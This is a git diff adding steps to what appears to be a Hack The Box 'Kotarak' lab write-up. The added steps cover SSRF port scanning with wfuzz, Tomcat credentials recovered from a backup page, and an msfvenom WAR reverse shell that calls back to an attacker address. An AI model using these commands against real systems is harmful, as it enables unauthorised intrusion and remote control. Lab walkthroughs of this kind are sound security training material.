@@ -23,6 +23,36 @@ This Machine is the Hard level machine so i will prefer the Full Port Scan :-
 
 ![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/burp.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/burp.png)
 
+=> Scanning Ports on [localhost](http://localhost) using wfuzz 
+
+**`wfuzz -c -z range,1-65535 --hl=2 http://10.10.10.55:60000/url.php?path=http://localhost:FUZZ`**
+![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/wfuzz.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/wfuzz.png)
+
+→ [localhost:888](http://localhost:888) has interesting things :
+
+![https://github.com/unknown00759/unknown00759.github.io/blob/master/img/HTB-KOTARAK/back.png](https://github.com/unknown00759/unknown00759.github.io/blob/master/img/HTB-KOTARAK/back.png)
+
+→ Taking a look at **backup** option.
+
+![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/se.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/se.png)
+
+![https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/cred.png](https://raw.githubusercontent.com/unknown00759/unknown00759.github.io/master/img/HTB-KOTARAK/cred.png)
+
+We got credentials for tomcat
+
+```
+admin : 3@g01PdhB!
+```
+
+⇒ Logged in on tomcat manager page. Uploaded a WAR msfvenom shell and popped a shell :
+
+```
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f war > shell.war
+```
+![https://github.com/unknown00759/unknown00759.github.io/blob/master/img/HTB-KOTARAK/image.png](https://github.com/unknown00759/unknown00759.github.io/blob/master/img/HTB-KOTARAK/image.png)
+
+![https://github.com/unknown00759/unknown00759.github.io/blob/master/img/HTB-KOTARAK/image.png](https://github.com/unknown00759/unknown00759.github.io/blob/master/img/HTB-KOTARAK/image.png)
+
 
 
 
